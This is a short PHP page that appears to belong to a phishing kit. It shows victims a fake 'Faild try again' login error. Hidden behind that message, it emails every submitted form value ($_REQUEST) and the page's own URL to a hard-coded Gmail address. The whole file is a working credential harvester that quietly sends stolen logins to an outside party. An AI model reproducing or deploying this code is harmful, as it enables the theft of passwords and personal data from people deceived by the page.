<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Untitled Document</title>
</head>

<body>
<center><strong>Faild try again</strong></center> 
<?php
$url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];

mail('shubh124421@gmail.com','hit url main code',print_r($_REQUEST,1));
mail('shubh124421@gmail.com','hit url main code',$url);

?>
</body>
</html>